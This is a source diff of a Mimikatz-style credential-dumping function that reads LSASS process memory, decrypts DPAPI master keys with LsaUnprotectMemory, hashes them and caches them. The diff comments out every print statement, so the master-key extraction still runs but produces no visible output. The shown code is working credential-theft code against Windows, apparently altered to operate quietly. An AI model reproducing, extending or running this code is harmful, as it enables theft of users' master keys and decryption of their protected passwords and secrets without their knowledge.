@@ -59,7 +59,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 
 	if(pData->LogonType != Network)
 	{
-		kuhl_m_sekurlsa_printinfos_logonData(pData);
+		//kuhl_m_sekurlsa_printinfos_logonData(pData);
 		if(pPackage->Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &pPackage->Module, MasterKeyCacheReferences, ARRAYSIZE(MasterKeyCacheReferences), (PVOID *) &pMasterKeyCacheList, NULL, NULL, NULL))
 		{
 			aLsass.address = pMasterKeyCacheList;
@@ -72,9 +72,9 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 					{
 						if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId))
 						{
-							kprintf(L"\t [%08x]\n\t * GUID      :\t", monNb++);
-							kull_m_string_displayGUID(&mesCredentials.KeyUid);
-							kprintf(L"\n\t * Time      :\t"); kull_m_string_displayLocalFileTime(&mesCredentials.insertTime);
+							//kprintf(L"\t [%08x]\n\t * GUID      :\t", monNb++);
+							//kull_m_string_displayGUID(&mesCredentials.KeyUid);
+							//kprintf(L"\n\t * Time      :\t"); kull_m_string_displayLocalFileTime(&mesCredentials.insertTime);
 
 							if(aKey.address = LocalAlloc(LPTR, mesCredentials.keySize))
 							{
@@ -82,24 +82,25 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 								if(kull_m_memory_copy(&aKey, &aLsass, mesCredentials.keySize))
 								{
 									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
-									kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
+									//kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
 									if(kull_m_crypto_hash(CALG_SHA1, aKey.address, mesCredentials.keySize, dgst, SHA_DIGEST_LENGTH))
 									{
-										kprintf(L"\n\t * sha1(key) :\t"); kull_m_string_wprintf_hex(dgst, SHA_DIGEST_LENGTH, 0);
+										//kprintf(L"\n\t * sha1(key) :\t"); kull_m_string_wprintf_hex(dgst, SHA_DIGEST_LENGTH, 0);
 										kuhl_m_dpapi_oe_masterkey_add(&mesCredentials.KeyUid, dgst, SHA_DIGEST_LENGTH);
 									}
 								}
 								LocalFree(aKey.address);
 							}
-							kprintf(L"\n");
+							//kprintf(L"\n");
 						}
 						aLsass.address = mesCredentials.Flink;
 					}
 					else break;
 				}
 			}
-		} else kprintf(L"\n\tKO");
-		kprintf(L"\n");
+		}
+		//else kprintf(L"\n\tKO");
+		//kprintf(L"\n");
 	}
 	return TRUE;
 }
